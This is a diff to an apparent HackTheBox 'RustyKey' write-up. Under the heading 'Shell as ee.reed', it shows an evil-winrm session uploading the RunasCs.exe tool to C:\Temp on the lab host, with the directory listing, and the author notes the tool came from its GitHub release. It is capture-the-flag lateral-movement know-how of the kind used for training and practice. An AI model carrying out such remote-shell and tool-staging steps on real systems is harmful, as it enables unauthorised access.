@@ -411,6 +411,26 @@ Its also worth noting `ee.reed` is part of the support group, the pdf explicitly
 # Shell as `ee.reed`
 
 ```python
+evil-winrm-py PS C:\Temp> upload RunasCs.exe .
+Uploading /home/kali/htb/RustyKey/RunasCs.exe: 100%|█████████████████████| 50.5k/50.5k [00:00<00:00, 167kB/s]
+[+] File uploaded successfully as: C:\Temp\RunasCs.exe
+evil-winrm-py PS C:\Temp> dir
+
+
+    Directory: C:\Temp
+
+
+Mode                LastWriteTime         Length Name                                                                   
+----                -------------         ------ ----                                                                   
+-a----       10/19/2026   5:23 PM          51712 RunasCs.exe                                                            
+
+
+evil-winrm-py PS C:\Temp>
+```
+
+Ill upload the tool, i just downloaded the release from the github page
+
+```python
 
 ```
 
